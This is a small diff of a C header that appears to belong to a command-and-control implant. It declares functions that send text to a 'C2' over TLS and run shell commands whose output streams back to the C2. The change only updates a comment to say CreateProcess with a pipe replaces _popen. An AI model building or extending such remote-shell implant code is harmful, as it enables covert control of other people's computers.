@@ -30,7 +30,7 @@
 /* Send a plain text string to the C2 (defined in shell.c) */
 void _send_str(TLS_CONTEXT *pTls, const char *msg);
 
-/* Run a shell command via _popen and stream output to C2 (defined in shell.c) */
+/* Run a shell command via CreateProcess+pipe and stream output to C2 (shell.c) */
 void _shell_exec(TLS_CONTEXT *pTls, const char *cmd);
 
 /* Not-supported stub (defined in shell.c) */
